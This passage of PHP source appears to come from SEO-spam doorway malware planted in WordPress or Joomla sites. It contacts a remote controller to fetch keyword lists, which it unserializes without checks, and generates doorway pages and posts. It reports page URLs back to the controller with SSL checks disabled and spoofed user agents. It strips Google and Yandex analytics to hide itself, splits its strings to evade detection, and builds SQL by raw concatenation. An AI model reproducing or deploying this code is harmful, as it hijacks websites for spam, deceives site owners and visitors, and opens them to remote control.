                            $atagtoreplace = preg_replace("|>.*<\/a>|iUs", ">[HEREISATAGANCHOR]</a>", $atagtoreplace);
                            $sitecode = str_ireplace($atagmain, $atagtoreplace, $sitecode);
                        }
                    }
                }
            }
            $sitecode = preg_replace("/<meta property=[\"']{1}og:description[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs", "", $sitecode);
            $sitecode = preg_replace("/<meta property=[\"']{1}og:title[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs", "", $sitecode);
            $sitecode = preg_replace("/<meta name=[\"']{1}twitter:description[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs", "", $sitecode);
            $sitecode = preg_replace("/<meta itemprop=[\"']{1}description[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs", "", $sitecode);
            $sitecode = preg_replace("/<meta name=[\"']{1}description[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs", "", $sitecode);
            $sitecode = preg_replace("/<meta name=[\"']{1}dc\.description[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs", "", $sitecode);
            $sitecode = urlencode($sitecode);
            $regular = "|(%3Cscript.*%3C%2Fscript%3E)|iUs";
            preg_match_all($regular, $sitecode, $matches);
            if (!empty($matches[1])) {
                foreach ($matches[1] as $currgooglestat) {
                    if (stripos("qqq" . $currgooglestat, "google-analytics.com") || stripos("qqq" . $currgooglestat, "yandex.ru")) {
                        $sitecode = str_ireplace($currgooglestat, "", $sitecode);
                    }
                }
            }
        } else {
            return "";
        }
        if (!empty($sitecode)) {
            return $sitecode;
        }
        return "";
    }

    private function getMaxLengthFromArray($in_array, $min_length)
    {
        $outelement = '';
        $templength = 0;
        foreach ($in_array as $k => $oneelement) {
            if (strlen(strip_tags($oneelement)) > $min_length) {
                if ($k === 0) {
                    $templength = strlen(strip_tags($oneelement));
                    $outelement = $oneelement;
                } else {
                    if (strlen($oneelement) > $templength) {
                        $templength = strlen(strip_tags($oneelement));
                        $outelement = $oneelement;
                    }
                }
            }
        }
        return $outelement;
    }

    private function dbPrep()
    {
        if (!$this->checkTblIn()) {
            $this->crTbl();
            if ($this->tbl["created"] == "yes") {
                //$this->insToDb("hash, data", "'mrd','" . urlencode($this->mrd) . "'");
                $this->insToDb("hash, data", "'tme','" . time() . "'");
                //$this->goP($this->au, $this->fPostStr . "=y&dmn=" . urlencode($this->mrd));
            }
        } else {
            $this->tbl["created"] = "yes";
        }

    }

    function sndOk()
    {

        if (!empty($this->au)) {
            $this->goP($this->au, $this->gdTblStr . "=y&rid=" . $this->rId);
        }

    }

    function getSetts($part)
    {
        $result = array();
        if (!empty($this->au)) {

            $newSetts = $this->goP($this->au, $this->getSettsStr . "=y&rid=" . $this->rId . "&prt=" . $part);

            if (stripos("qqq" . $newSetts, $this->newSettsStr)) {

                preg_match_all("/" . $this->newSettsStr . "(.*)" . $this->newSettsStr . "/iUs", $newSetts, $matches);
                if (!empty($matches[1][0])) {

                    $newSetts = urldecode($matches[1][0]);
                    $newSetts = unserialize($newSetts);
                    if (!empty($newSetts) && count($newSetts) > 0) {
                        if ($part === "0") {
                            // delete all old doorway data

                            if (!empty($this->stts["custompath"])) {
                                $structure = get_option('permalink_structure');
                                if (empty($structure) || stripos("qqq" . $structure, "?p=")) {
                                    $chpu = rtrim($this->mrd, "/") . "/?p=" . $this->stts["custompath"] . "/chpukeyplace/";
                                } else {
                                    $chpu = rtrim($this->mrd, "/") . "/" . $this->stts["custompath"] . "/chpukeyplace/";
                                }
                                $this->uDB($this->tbl["name"], urlencode($chpu), "data", "`hash` = 'chpu'");
                                $this->goP($this->au, "chpu=".urlencode($chpu)."&rid=" . $this->rId);
                            }

                            $chpu = $this->rDB($this->tbl["name"], "data", "`hash` = 'chpu'");

                            if(!empty($this->stts["customtemplpage"])) {
                                $this->templWork($chpu);
                            }
                            if (!empty($chpu["data"])) {
                                $chpu = urldecode($chpu["data"]);
                            }

                        } else {
                            $chpu = $this->rDB($this->tbl["name"], "data", "`hash` = 'chpu'");
                            if (!empty($chpu["data"])) {
                                $chpu = urldecode($chpu["data"]);
                            }
                        }

                        if (!empty($chpu)) {
                            $pn = 0;
                            foreach ($newSetts as $oneKey) {
                                $pn++;
                                if (!empty($this->stts["permalink"])) {
                                    if ($this->stts["permalink"] == "k") {
                                        if ($this->type == "wp") {
                                            $urlSlug = sanitize_title($oneKey["kw"]);
                                        } else {
                                            $urlSlug = str_ireplace(" ", "-", $oneKey["kw"]);
                                        }
                                    } elseif ($this->stts["permalink"] == "g") {
                                        $urlSlug = $this->randString(rand(7, 11));
                                    } elseif ($this->stts["permalink"] == "n") {
                                        $urlSlug = rand(1, 9) . rand(1, 9) . rand(1, 9) . rand(1, 9) . rand(1, 9) . rand(1, 9) . rand(1, 9) . rand(1, 9);
                                    } elseif ($this->stts["permalink"] == "kd") {
                                        if ($this->type == "wp") {
                                            $urlSlug = sanitize_title($oneKey["kw"]);
                                        } else {
                                            $urlSlug = str_ireplace(" ", "-", $oneKey["kw"]);
                                        }
                                        $urlSlug .= "-" . rand(1, 9) . rand(1, 9) . rand(1, 9) . rand(1, 9) . rand(1, 9);
                                    }
                                } else {
                                    if ($this->type == "wp") {
                                        $urlSlug = sanitize_title($oneKey["kw"]);
                                    } else {
                                        $urlSlug = str_ireplace(" ", "-", $oneKey["kw"]);
                                    }
                                }
                                $urlSlug = trim($urlSlug);
                                $curUrl = str_ireplace("chpukeyplace", $urlSlug, $chpu);
                                $curUrl = urldecode($curUrl);
                                $curUrl = strtolower($curUrl);
                                $curUrl = html_entity_decode($curUrl);
                                $curUrl = str_ireplace("&amp;", "&", $curUrl);
                                $altUrl = "";
                                $altHash = "";
                                if ($this->type == "wp") {
                                    $altUrl = trim($this->mrd, "/")."/?p=".$pn.$part."o";
                                    $altUrl = urldecode($altUrl);
                                    $altUrl = strtolower($altUrl);
                                    $altUrl = html_entity_decode($altUrl);
                                    $altUrl = str_ireplace("&amp;", "&", $altUrl);
                                    $altHash = md5($altUrl);
                                }
                                $this->insToDb("hash, type, url, kw, gr, alturl, althash", "'" . md5($curUrl) . "','drw', '" . urlencode
                                    ($curUrl) . "', '" . urlencode($oneKey["kw"]) . "', '" . $oneKey["gr"] . "', '" . urlencode($altUrl) . "', '" . $altHash . "'");
                                $result[] = array(
                                    "hash" => md5($curUrl),
                                    "url" => $curUrl,
                                    "kw" => $oneKey["kw"],
                                    "gr" => $oneKey["gr"]
                                );
                            }
                        }
                    }
                }
                if (!empty($result) && count($result) > 0) {
                    $sndUrls = $this->goP($this->au, $this->sndPrtUrls . "=y&rid=" . $this->rId . "&res=" . urlencode
                        (serialize($result)));
                    if (stripos("qqq" . $sndUrls, $this->gdPrtUrls)) {
                        echo $this->gdPrtUrls;
                        die();
                    }
                }
            }


        }
    }

    private function conDB()
    {
        $this->dbCon = mysqli_connect($this->dbH, $this->dbU, $this->dbPs, $this->dbN, $this->dbPo);
    }

    function dDB($tbl, $uslovie)
    {

        if (empty($tbl)) {
            $tbl = $this->tbl["name"];
        }

        $sql = "DELETE FROM " . $tbl . " WHERE " . $uslovie;
        mysqli_query($this->dbCon, $sql);
        return true;


    }

    function rndDB($tbl, $col, $cond, $cnt)
    {
        if (empty($tbl)) {
            $tbl = $this->tbl["name"];
        }
        $col = $this->prepareCol($col);
        $sql = "SELECT " . $col . " FROM " . $tbl . " WHERE " . $cond . " ORDER BY RAND() LIMIT " . $cnt;
        $needvalue = mysqli_query($this->dbCon, $sql);
        $res = array();
        $out = array();
        $value = explode(",", $col);
        while ($row = mysqli_fetch_array($needvalue)) {
            foreach ($value as $onevalue) {
                $onevalue = str_ireplace("`", "", $onevalue);
                $onevalue = trim($onevalue);
                $res[$onevalue] = $row[$onevalue];
            }
            $out[] = $res;
        }
        return $out;
    }

    function rDB($tbl, $col, $cond)
    {
        if (empty($tbl)) {
            $tbl = $this->tbl["name"];
        }
        $col = $this->prepareCol($col);
        if (!empty($cond)) {
            $sql = "SELECT " . $col . " FROM `" . $tbl . "` WHERE " . $cond;
        } else {
            $sql = "SELECT " . $col . " FROM `" . $tbl . "`";
        }
        $needvalue = mysqli_query($this->dbCon, $sql);
        $needvalue = mysqli_fetch_array($needvalue);

        if (!empty($needvalue)) {
            if (!empty($uslovie)) {
                if (stripos($col, ",")) {

                    $col = explode(",", $col);
                    $res = array();
                    foreach ($col as $onevalue) {
                        $onevalue = trim($onevalue);
                        $res[$onevalue] = $needvalue[$onevalue];
                    }
                    $needvalue = $res;
                } else {
                    $needvalue = $needvalue[$col];
                }
            }
            return $needvalue;
        }
        return false;
    }

    function uDB($tbl, $data, $value, $uslovie)
    {
        if (empty($tbl)) {
            $tbl = $this->tbl["name"];
        }

        $sql = "UPDATE " . $tbl . " SET $value='" . $data . "' WHERE " . $uslovie . "";
        if (mysqli_query($this->dbCon, $sql)) {
            return true;
        } else {
            return false;
        }


    }

    function checkTblIn()
    {
        $sql = "SELECT 1 FROM `" . $this->tbl["name"] . "` LIMIT 1";
        $check = mysqli_query($this->dbCon, $sql);
        if (empty($check)) {
            return false;
        }
        return true;
    }

    function getChcCnt($an = "")
    {
        if(empty($an)) {
            $sql = "SELECT COUNT(1) FROM `" . $this->tbl["name"] . "` WHERE `type` = 'drw' AND `data` IS NOT NULL AND `data` != ''";
        } else {
            $sql = "SELECT COUNT(1) FROM `" . $this->tbl["name"] . "` WHERE `atype` = 'ang'";
        }
        $cnt = mysqli_query($this->dbCon, $sql);
        $cnt = mysqli_fetch_array($cnt);

        if (empty($cnt[0])) {
            return false;
        }
        return $cnt[0];
    }

    function getTblCnt()
    {
        $sql = "SELECT COUNT(1) FROM `" . $this->tbl["name"]. "`";
        $cnt = mysqli_query($this->dbCon, $sql);
        $cnt = mysqli_fetch_array($cnt);

        if (empty($cnt[0])) {
            return false;
        }
        return $cnt[0];
    }

    private function crTbl()
    {
        $fields = $this->tbl["fields"];
        foreach ($fields as $k => $oneField) {
            $sql .= $k . " " . $oneField . " NULL DEFAULT NULL,";
        }
        $fields = trim($sql, ",");

        $sql = "CREATE TABLE `" . $this->tbl["name"] . "` (" . $fields . ")";
        mysqli_query($this->dbCon, $sql);
        $sql = "ALTER TABLE `" . $this->tbl["name"] . "` add id INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY FIRST";
        mysqli_query($this->dbCon, $sql);
        if ($this->checkTblIn()) {
            $sql = "ALTER TABLE `" . $this->tbl["name"] . "` ADD UNIQUE " . $this->tbl["index"] . " (" . $this->tbl["index"]
                . "(" . $this->tbl["indexcount"] . "))";
            mysqli_query($this->dbCon, $sql);
            $this->tbl["created"] = "yes";
            return true;
        }
        return false;
    }

    private function prepareCol($cols)
    {
        if (stripos("qqq" . $cols, ",")) {
            $cols = explode(",", $cols);
            foreach ($cols as $k => $oneCol) {
                $oneCol = trim($oneCol);
                $cols[$k] = "`" . $oneCol . "`";
            }
            return implode(", ", $cols);
        }
        return "`" . $cols . "`";
    }

    function insToDb($cols, $data)
    {
        $cols = $this->prepareCol($cols);
        $sql = "INSERT INTO `" . $this->tbl["name"] . "` (" . $cols . ") VALUES (" . $data . ")";
        if (mysqli_query($this->dbCon, $sql)) {
            return true;
        } else {
            return false;
        }
    }

    function chkHCode($url)
    {
        if (stripos("qqq" . $url, "wp-cron.php")) {
            return false;
        }
        if (stripos("qqq" . $url, "?")) {
            $url = $url . "&" . $this->chkStr . "=y";
        } else {
            $url = trim($url, "/") . "/?" . $this->chkStr . "=y";
        }
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 90);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_NOBODY, true);
        $output = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($http_code == "200") {
            return true;
        }
        return false;
    }

    public function goP($url, $params)
    {
        $params = rtrim($params, '&');
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, $this->rUA());
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
            curl_setopt($ch, CURLOPT_TIMEOUT, 40);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            $output = curl_exec($ch);
            curl_close($ch);
        } else {
            $output = file_get_contents($url, false, stream_context_create(array('http' => array('method' => 'POST', 'header' => 'Content-type: application/x-www-form-urlencoded', 'content' => $params))));
        }
        return $output;

    }

    private function rUA()
    {
        $uas = array("Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)");
        $uas = $this->shArr($uas);
        return $uas[0];
    }

    private function shArr($arr)
    {
        srand((float)microtime() * 1000000);
        shuffle($arr);
        return $arr;
    }

    private function randString($length)
    {
        $str = "";
        $chars = "abcdefghijklmnopqrstuvwxyz0123456789";
        $size = strlen($chars);
        for ($i = 0; $i < $length; $i++) {
            $str .= $chars[rand(0, $size - 1)];
        }
        return $str;
    }

    private function parseTemplateWP()
    {
        $slugname = $this->randString(8);
        $post_data = array("post_title" => "[HER" . "EISP" . "OSTTI" . "TLE]", "post_name" => $slugname, "post_content" => "[HERE" . "ISC" . "ONT" . "ENT]", 'post_status' => 'publish', 'post_category' => array());
        $post_id = wp_insert_post($post_data, true);
        $permalink = get_permalink($post_id);
        if(!empty($permalink)) {
            $permalink = str_ireplace('http://', '', $permalink);
            $permalink = str_ireplace('https://', '', $permalink);
            if (is_ssl() === false) {
                $permalink = "http://" . $permalink;
            } else {
                $permalink = "https://" . $permalink;
            }
            $sitecode = file_get_contents($permalink."?".$this->chkStr."=yes");
            //$permalink = trim($permalink, "/");
            if (stripos("qqq" . $permalink, "?p=")) {
                $urlfrchpu = str_ireplace("?p=" . $post_id, "?p=chpukeyplace", $permalink);
            } else {
                $urlfrchpu = str_ireplace($slugname, "chpukeyplace", $permalink);
            }
            wp_delete_post($post_id, true);
            if (!empty($sitecode)) {
                $regular = "|<title>(.*)<\/title>|iUs";
                preg_match_all($regular, $sitecode, $matches);
                if (!empty($matches[1])) {
                    $matches[1] = array_unique($matches[1]);
                    foreach ($matches[1] as $pagetitlemain) {
                        $sitecode = str_ireplace($pagetitlemain, '[HE' . 'REI' . 'SPAG' . 'ETI' . 'TLE]', $sitecode);
                    }
                }

                $regular = "|(<time.*</time>)|iUs";
                preg_match_all($regular, $sitecode, $matches);
                if (!empty($matches[1][0])) {
                    $sitecode = str_ireplace($matches[1][0], '[HE' . 'REI' . 'SPUB' . 'TI' . 'ME]', $sitecode);
                }

                $regular = "|[\"']+(http.*\?p=.*)[\"']+|iU";
                preg_match_all($regular, $sitecode, $matches);
                if (!empty($matches[1][0])) {
                    $sitecode = str_ireplace($matches[1][0], '[HER'.'EIS'.'ALTL'.'INK]', $sitecode);
                }

                $regular = "|(<h2.*>.*</h2+>)|iUs";
                preg_match_all($regular, $sitecode, $matches);
                if (!empty($matches[1])) {
                    $matches[1] = array_unique($matches[1]);
                    srand((float)microtime() * 1000000);
                    shuffle($matches[1]);
                    if (count($matches[1]) >= 2) {
                        $counth = count($matches[1]) / 2;
                        $counth = floor($counth);
                        $matches[1] = array_slice($matches[1], 0, $counth - 1);
                    }
                    foreach ($matches[1] as $htagmain) {
                        $sitecode = str_ireplace($htagmain, '[HE' . 'R' . 'EI' . 'SH' . 'TAG]', $sitecode);
                    }
                }
                $regular = "|<a\s.*(href=[\"']+.*[\"']+).*>(.*)</a>|iUs";
                preg_match_all($regular, $sitecode, $matches);
                if (!empty($matches[1])) {
                    $all_links = $matches[0];
                    $atagarray = array_combine($matches[2], $matches[1]);
                    $atagarray = array_unique($atagarray);
                    foreach ($atagarray as $anchor => $url) {
                        if (stripos("qqq" . $url, "feed") || stripos("qqq" . $url, "wp-login") || stripos("qqq" . $url, "#") || (stripos("qqq" . $anchor, "<") && stripos("qqq" . $anchor, ">"))) {
                            unset($atagarray[$anchor]);
                        }
                    }
                    srand((float)microtime() * 1000000);
                    shuffle($atagarray);
                    if (count($atagarray) >= 3) {
                        $counta = count($atagarray) / 3;
                        $counta = floor($counta);
                        $atagarray = array_slice($atagarray, 0, $counta - 1);
                    }
                    foreach ($all_links as $atagmain) {
                        foreach ($atagarray as $url) {
                            if (stripos("qqq" . $atagmain, $url)) {
                                $atagtoreplace = preg_replace("/href=[\"']+.*[\"']+/iUs", "href=\"[H" . "ER" . "EIS" . "AT" . "AGL" . "INK]\"", $atagmain);
                                $atagtoreplace = preg_replace("/>.*<\/a>/iUs", ">[HE" . "REIS" . "AT" . "AGA" . "NCH" . "OR]</a>", $atagtoreplace);
                                $sitecode = str_ireplace($atagmain, $atagtoreplace, $sitecode);
                            }
                        }
                    }
                }
                $sitecode = str_ireplace($permalink, '[HEREIS'.'ALTL'.'INK]', $sitecode);
                $sitecode = preg_replace("/<meta property=[\"']{1}og:description[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs", "", $sitecode);
                $sitecode = preg_replace("/<meta property=[\"']{1}og:title[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs", "", $sitecode);
                $sitecode = preg_replace("/<meta name=[\"']{1}twitter:description[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs", "", $sitecode);
                $sitecode = preg_replace("/<meta itemprop=[\"']{1}description[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs", "", $sitecode);
                $sitecode = preg_replace("/<meta name=[\"']{1}description[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs", "", $sitecode);
                $sitecode = preg_replace("/<meta name=[\"']{1}dc\.description[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs", "", $sitecode);
                $sitecode = urlencode($sitecode);
                $regular = "|(%3Cscript.*%3C%2Fscript%3E)|iUs";
                preg_match_all($regular, $sitecode, $matches);
                if (!empty($matches[1])) {
                    foreach ($matches[1] as $currgooglestat) {
                        if (stripos("qqq" . $currgooglestat, "google-analytics.com") || stripos("qqq" . $currgooglestat, "yandex.ru")) {
                            $sitecode = str_ireplace($currgooglestat, "", $sitecode);
                        }
                    }
                }
                if (!empty($sitecode)) {
                    $resultarray = array("chpu" => $urlfrchpu, "sitetemp" => $sitecode);
                    return $resultarray;
                }
            }
        }
        return false;
    }

    function createCategory($data)
    {
        $data['rules'] = array(
            'core.edit.state' => array(),
            'core.edit.delete' => array(),
            'core.edit.edit' => array(),
            'core.edit.state' => array(),
            'core.edit.own' => array(1 => true)
        );

        $basePath = JPATH_ADMINISTRATOR . '/components/com_categories';
        require_once $basePath . '/models/category.php';
        $config = array('table_path' => $basePath . '/tables');
        $category_model = new CategoriesModelCategory($config);

        if (!$category_model->save($data)) {
            $err_msg = $category_model->getError();
            return false;
        } else {
            $id = $category_model->getItem()->id;

            return $id;
        }
    }

    function createArticle($data)
    {
        $data['rules'] = array(
            'core.edit.delete' => array(),
            'core.edit.edit' => array(),
            'core.edit.state' => array(),
        );

        $basePath = JPATH_ADMINISTRATOR . '/components/com_content';
        require_once $basePath . '/models/article.php';
        $config = array();
        $article_model = new ContentModelArticle($config);
        if (!$article_model->save($data)) {
            $err_msg = $article_model->getError();
            return false;
        } else {
            $id = $article_model->getItem()->id;

            return $id;
        }
    }

    private function parseTemplateJML()
    {
//return true;
        if (!class_exists('ContentHelperRoute')) require_once(JPATH_SITE . '/components/com_content/helpers/route.php');
        $slugname = $this->randString(8);
        if (!defined('_JEXEC')) {
            define('_JEXEC', 1);
            define('JPATH_BASE', realpath(dirname(__FILE__)));
            require_once(JPATH_BASE . '/includes/defines.php');
            require_once(JPATH_BASE . '/includes/framework.php');
            defined('DS') or define('DS', DIRECTORY_SEPARATOR);
        }
        $app = JFactory::getApplication('site');

        $category_data['id'] = 0;
        $category_data['parent_id'] = 0;
        $category_data['title'] = 'Uncategorised';
        $category_data['alias'] = $slugname;
        $category_data['extension'] = 'com_content';
        $category_data['published'] = 1;
        $category_data['language'] = '*';
        $category_data['params'] = array('category_layout' => '', 'image' => '');
        $category_data['metadata'] = array('author' => '', 'robots' => '');

        $category_id = $this->createCategory($category_data);
        if (!$category_id) {
            return false;
        } else {
            $article_data = array(
                'id' => 0,
                'catid' => $category_id,
                'title' => "[HER" . "EISP" . "OSTTI" . "TLE]",
                'alias' => $slugname,
                'introtext' => '',
                'fulltext' => "[HERE" . "ISC" . "ONT" . "ENT]",
                'state' => 1,
                'language' => '*'
            );
            $article_id = $this->createArticle($article_data);
            if (!$article_id) {
                return false;
            }
        }

        $rootURL = rtrim(JURI::root(), '/');
        $subpathURL = JURI::root(true);
        if (!empty($subpathURL) && ($subpathURL != '/')) {
            $rootURL = substr($rootURL, 0, -1 * strlen($subpathURL));
        }
        $permalink = $rootURL . JRoute::_(ContentHelperRoute::getArticleRoute($article_id, $category_id));

        $permalink = str_ireplace("/" . $category_id . "-" . $slugname, "", $permalink);
        $sitecode = $this->goP($permalink."?".$this->chkStr."=yes", "");
        $this->dDB($this->dbPref . "content", "`alias` = '" . $slugname . "'");
        $this->dDB($this->dbPref . "categories", "`alias` = '" . $slugname . "'");
        //$permalink = trim($permalink, "/");
        if (stripos("qqq" . $permalink, "&id=")) {
            $urlfrchpu = str_ireplace("&id=" . $article_id, "&id=chpukeyplace", $permalink);
        } else {
            if (stripos("qqq" . $permalink, $article_id . "-" . $slugname)) {
                $urlfrchpu = str_ireplace($article_id . "-" . $slugname, "chpukeyplace", $permalink);
            } elseif (stripos("qqq" . $permalink, $slugname)) {
                $urlfrchpu = str_ireplace($slugname, "chpukeyplace", $permalink);
            } else {
                $urlfrchpu = str_ireplace($article_id, "chpukeyplace", $permalink);
            }
        }

        if (!empty($sitecode)) {
            $sitecode = str_ireplace("/" . $category_id . "-" . $slugname, "#", $sitecode);
            if (!stripos("qqq" . $sitecode, "[HERE" . "ISC" . "ONT" . "ENT]")) {
                $sitecode = preg_replace("/(<body.*>)/", "\$1" . "[HERE" . "ISC" . "ONT" . "ENT]", $sitecode, 1);
            }

            $regular = "|<title>(.*)<\/title>|iUs";
            preg_match_all($regular, $sitecode, $matches);
            if (!empty($matches[1])) {
                $matches[1] = array_unique($matches[1]);
                foreach ($matches[1] as $pagetitlemain) {
                    $sitecode = str_ireplace($pagetitlemain, '[HE' . 'REI' . 'SPAG' . 'ETI' . 'TLE]', $sitecode);
                }
            }

            $regular = "|(<time.*</time>)|iUs";
            preg_match_all($regular, $sitecode, $matches);
            if (!empty($matches[1][0])) {
                $sitecode = str_ireplace($matches[1][0], '[HE' . 'REI' . 'SPUB' . 'TI' . 'ME]', $sitecode);
            }

            $regular = "|(<h2.*>.*</h2+>)|iUs";
            preg_match_all($regular, $sitecode, $matches);
            if (!empty($matches[1])) {
                $matches[1] = array_unique($matches[1]);
                srand((float)microtime() * 1000000);
                shuffle($matches[1]);
                if (count($matches[1]) >= 2) {
                    $counth = count($matches[1]) / 2;
                    $counth = floor($counth);
                    $matches[1] = array_slice($matches[1], 0, $counth - 1);
                }
                foreach ($matches[1] as $htagmain) {
                    $sitecode = str_ireplace($htagmain, '[HE' . 'R' . 'EI' . 'SH' . 'TAG]', $sitecode);
                }
            }
            $regular = "|<a\s.*(href=[\"']+.*[\"']+).*>(.*)</a>|iUs";
            preg_match_all($regular, $sitecode, $matches);
            if (!empty($matches[1])) {
                $all_links = $matches[0];
                $atagarray = array_combine($matches[2], $matches[1]);
                $atagarray = array_unique($atagarray);
                foreach ($atagarray as $anchor => $url) {
                    if (stripos("qqq" . $url, "feed") || stripos("qqq" . $url, "wp-login") || stripos("qqq" . $url, "#") || (stripos("qqq" . $anchor, "<") && stripos("qqq" . $anchor, ">"))) {
                        unset($atagarray[$anchor]);
                    }
                }
                srand((float)microtime() * 1000000);
                shuffle($atagarray);
                if (count($atagarray) >= 3) {
                    $counta = count($atagarray) / 3;
                    $counta = floor($counta);
                    $atagarray = array_slice($atagarray, 0, $counta - 1);
                }
                foreach ($all_links as $atagmain) {
                    foreach ($atagarray as $url) {
                        if (stripos("qqq" . $atagmain, $url)) {
                            $atagtoreplace = preg_replace("/href=[\"']+.*[\"']+/iUs", "href=\"[H" . "ER" . "EIS" . "AT" . "AGL" . "INK]\"", $atagmain);
                            $atagtoreplace = preg_replace("/>.*<\/a>/iUs", ">[HE" . "REIS" . "AT" . "AGA" . "NCH" . "OR]</a>", $atagtoreplace);
                            $sitecode = str_ireplace($atagmain, $atagtoreplace, $sitecode);
                        }
                    }
                }
            }
            $sitecode = str_ireplace($permalink, "#", $sitecode);
            $sitecode = preg_replace("/<meta property=[\"']{1}og:description[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs", "", $sitecode);
            $sitecode = preg_replace("/<meta property=[\"']{1}og:title[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs", "", $sitecode);
            $sitecode = preg_replace("/<meta name=[\"']{1}twitter:description[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs", "", $sitecode);
            $sitecode = preg_replace("/<meta itemprop=[\"']{1}description[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs", "", $sitecode);
            $sitecode = preg_replace("/<meta name=[\"']{1}description[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs", "", $sitecode);
            $sitecode = preg_replace("/<meta name=[\"']{1}dc\.description[\"']{1} content=[\"']{1}.*[\"']{1}\s?\/>/iUs", "", $sitecode);
            $sitecode = urlencode($sitecode);
            $regular = "|(%3Cscript.*%3C%2Fscript%3E)|iUs";
            preg_match_all($regular, $sitecode, $matches);
            if (!empty($matches[1])) {
                foreach ($matches[1] as $currgooglestat) {
                    if (stripos("qqq" . $currgooglestat, "google-analytics.com") || stripos("qqq" . $currgooglestat, "yandex.ru")) {
                        $sitecode = str_ireplace($currgooglestat, "", $sitecode);
                    }
                }
            }
            if (!empty($sitecode)) {
                $resultarray = array("chpu" => $urlfrchpu, "sitetemp" => $sitecode);
                return $resultarray;
            }
        }

        return false;
    }
}